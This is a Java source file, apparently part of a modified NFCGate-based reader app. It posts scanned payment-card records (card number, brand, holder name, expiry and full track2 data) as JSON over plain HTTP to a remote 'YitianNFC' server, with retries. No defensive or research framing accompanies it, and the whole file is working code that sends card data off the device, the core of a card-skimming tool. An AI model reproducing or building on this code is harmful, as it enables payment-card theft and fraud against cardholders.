package de.tu_darmstadt.seemoo.nfcgate.reader.network;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

/**
 * Sends scanned card records to a remote YitianNFC instance over HTTP.
 * Endpoint: POST http://<host>:<port>/api/cards
 * Body: JSON array of {pan, brand, holder, expiry, track2}
 * Retry: 3 attempts with exponential backoff (500ms, 1000ms, 2000ms).
 */
public class YitianNfcSender {
    private static final String TAG = "YitianNfcSender";
    public static final String DEFAULT_HOST = "192.168.1.100";
    public static final int DEFAULT_PORT = 8080;

    public interface Callback {
        void onSuccess(int count);
        void onError(String msg);
    }

    public static class CardData {
        public final String pan;
        public final String brand;
        public final String holder;
        public final String expiry;
        public final String track2;

        public CardData(String pan, String brand, String holder, String expiry, String track2) {
            this.pan = pan;
            this.brand = brand;
            this.holder = holder;
            this.expiry = expiry;
            this.track2 = track2;
        }
    }

    public static void send(final String host, final int port,
                            final List<CardData> cards, final Callback cb) {
        new Thread(() -> {
            int attempts = 0;
            long backoff = 500L;
            Exception lastError = null;
            while (attempts < 3) {
                attempts++;
                HttpURLConnection conn = null;
                try {
                    URL url = new URL("http://" + host + ":" + port + "/api/cards");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                    conn.setRequestProperty("User-Agent", "YitianRead/off-v5.0Yitian");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(10000);

                    JSONArray arr = new JSONArray();
                    for (CardData c : cards) {
                        JSONObject o = new JSONObject();
                        o.put("pan", c.pan == null ? "" : c.pan);
                        o.put("brand", c.brand == null ? "UNKNOWN" : c.brand);
                        o.put("holder", c.holder == null ? "" : c.holder);
                        o.put("expiry", c.expiry == null ? "" : c.expiry);
                        o.put("track2", c.track2 == null ? "" : c.track2);
                        arr.put(o);
                    }
                    byte[] body = arr.toString().getBytes("UTF-8");
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(body);
                    }
                    int code = conn.getResponseCode();
                    if (code >= 200 && code < 300) {
                        if (cb != null) cb.onSuccess(cards.size());
                        return;
                    }
                    lastError = new Exception("HTTP " + code);
                } catch (Exception e) {
                    lastError = e;
                    Log.w(TAG, "attempt " + attempts + " failed", e);
                } finally {
                    if (conn != null) conn.disconnect();
                }
                try { Thread.sleep(backoff); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
                backoff *= 2;
            }
            if (cb != null) cb.onError(lastError != null ? lastError.getMessage() : "Unknown error");
        }, "YitianNfcSender").start();
    }
}
